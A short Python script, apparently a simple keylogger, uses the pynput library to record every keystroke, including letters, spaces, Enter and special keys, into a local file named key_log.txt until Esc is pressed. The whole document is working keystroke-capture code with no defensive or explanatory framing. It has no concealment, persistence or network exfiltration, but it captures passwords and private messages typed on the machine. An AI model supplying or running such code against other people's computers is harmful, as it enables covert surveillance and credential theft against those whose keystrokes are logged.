import pynput
from pynput.keyboard import Key, Listener

# File where the logs will be saved
log_file = "key_log.txt"

# Function to handle each keystroke event
def on_press(key):
    # Log the key that was pressed
    with open(log_file, "a") as log:
        try:
            # Record the key pressed (alphanumeric)
            log.write(f'{key.char}')
        except AttributeError:
            # Handle special keys (space, enter, etc.)
            if key == Key.space:
                log.write(' ')
            elif key == Key.enter:
                log.write('\n')
            else:
                log.write(f' [{key}] ')

# Function to stop the keylogger (optional)
def on_release(key):
    # You can set a key to stop the listener (example: Esc key)
    if key == Key.esc:
        return False

# Start the listener for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
